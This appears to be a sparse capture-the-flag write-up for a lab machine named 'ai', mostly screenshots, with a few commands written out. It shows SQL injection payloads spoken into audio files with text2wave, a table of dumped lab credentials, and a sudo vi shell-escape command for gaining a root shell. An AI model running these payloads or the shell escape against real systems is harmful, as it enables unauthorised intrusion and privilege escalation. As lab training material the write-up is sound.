# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/nH3chXp.png)
#### Port `80`
![](https://i.imgur.com/SwwOObD.png)
![](https://i.imgur.com/BFmTSbZ.png)
![](https://i.imgur.com/mbOsSVt.png)
![](https://i.imgur.com/hl8VWlN.png)
`  MrR3boot@ai.htb `
![](https://i.imgur.com/fshGIgK.png)
![](https://i.imgur.com/wzGqS2d.png)
- Tried to Create some TTS wav files using some websites and uploaded it but there was nothing. so i got some help over here and knew that there is a tool called `text2wav` for linux.
```shell
rexder@HunterDragon ~/C/H/m/ai> echo "Hello World"| text2wave > rex.wav
```
![](https://i.imgur.com/5PMeMEq.png)
- There is a `db.php` that means there is a database, so tried sqli
	- `echo "Hello Friend open Single quote"| text2wave > rex.wav` ![](https://i.imgur.com/gMqdiUk.png)
- After so much trial
	- `echo "open single quote, join , select, username from users pound sign"| text2wave > rex.wav`![](https://i.imgur.com/kaFQx37.png)
- `echo "open single quote, join , select, password from users pound sign"| text2wave > rex.wav` ![](https://i.imgur.com/JJB7vhZ.png)

	- ` alexa : H,Sq9t6}a<)?q93_ ` 
### Gaining Access
![](https://i.imgur.com/dUChPCv.png)

## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access
![](https://i.imgur.com/JZ1ESIk.png)
	![](https://i.imgur.com/mtvs0Rn.png)
`/usr/bin/vi`
```shell
/var/www
/var/www/html
```
![](https://i.imgur.com/f7hgJwZ.png)
```shell
+----------+------------------+
| username | password         |
+----------+------------------+
| alexa    | H,Sq9t6}a<)?q93_ |
| root     | H,Sq9t6}a<)?q931 |
| dbuser   | toor             |
| awsadm   | awsadm           |
+----------+------------------+
```
![](https://i.imgur.com/Im7mGg0.png)
`sudo -u mrr3boot vi -c ':!/bin/sh' /dev/null`
![](https://i.imgur.com/1mkxtbC.png)
![](https://i.imgur.com/B8Dh9Oe.png)
#### Port `8080`
![](https://i.imgur.com/Tl2zBm6.png)
#### Port `8000`
![](https://i.imgur.com/Imdr6QO.png)
![](https://i.imgur.com/NV8bRKz.png)
https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol
![](https://i.imgur.com/oMJfr6g.png)
![](https://i.imgur.com/1QYNtoF.png)

# Random Notes